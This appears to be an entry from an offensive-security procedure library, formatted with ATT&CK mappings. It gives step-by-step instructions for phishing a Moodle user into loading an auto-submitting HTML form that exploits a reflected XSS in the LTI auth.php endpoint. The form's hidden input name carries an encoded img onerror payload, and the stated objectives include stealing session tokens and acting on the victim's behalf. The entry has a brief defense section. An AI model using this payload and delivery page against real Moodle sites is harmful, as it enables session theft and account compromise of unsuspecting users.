---
id: proc-deliver-moodle-xss-2024
tags:
  - xss
  - payload-delivery
  - phishing
  - javascript
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/deliver-xss-html-form]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.427Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Deliver-Reflected-XSS-Payload-via-Auto-Submitting-HTML-Form

## Summary

This procedure crafts and delivers an HTML page that auto-submits a malicious POST request to the Moodle LTI endpoint, exploiting the reflected XSS to execute JavaScript like alert('document_domain') in the victim's browser context.

## Description

The attack relies on social engineering: the victim is tricked into visiting a hosted HTML page containing a form with a hidden input named with the XSS payload xxx&quot;&gt;&lt;img&#47;src&#61;&apos;x&apos;onerror&#61;alert&#40;&apos;document&#95;domain&apos;&#41;&gt; set to value 1. JavaScript pushes the state to root and submits the form, posting to /mod/lti/auth.php. Due to insufficient sanitization, the payload reflects and executes, allowing arbitrary HTML/JS injection for stealing cookies, phishing, or account compromise. Requires a vulnerable Moodle instance and victim interaction.

## Requirements

1. Confirmed vulnerable endpoint from prior scan
2. Ability to host HTML or send via email/link
3. Victim with access to the Moodle site (e.g., authenticated user)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding in LTI module
- Educate users on phishing links and avoid clicking unknown forms
- Log and alert on POST requests with encoded script payloads to /mod/lti/auth.php
- Deploy browser extensions or policies to block auto-submitting forms

## Objectives

1. Inject and execute malicious JavaScript in the victim's browser
2. Steal sensitive data like session tokens or perform actions on behalf of the user
3. Demonstrate full compromise potential from reflected XSS

## Instructions

### Step 1: Craft the HTML Payload

**Context**: Create the auto-submitting form with the encoded XSS payload in the input name attribute.

Save the following HTML to a file (e.g., xss-poc.html):

### Step 2: Host and Deliver

**Context**: Host the HTML on a web server or encode it for email delivery, then send the link to the victim.

**Command** ([[commands/deliver-xss-html-form]]):
```html
<html>
<body>
<form action="https://target.com/mod/lti/auth.php?" method="POST">
<input type="hidden" name="xxx&quot;&gt;&lt;img&#47;src&#61;&apos;x&apos;onerror&#61;alert&#40;&apos;document&#95;domain&apos;&#41;&gt;" value="1" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

> When loaded, this auto-submits the POST, triggering the XSS. Expected output is the alert execution in the browser, confirming payload delivery.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/deliver-xss-html-form]]

## Tools Used


## Tags

- xss
- payload-delivery
- phishing
- javascript
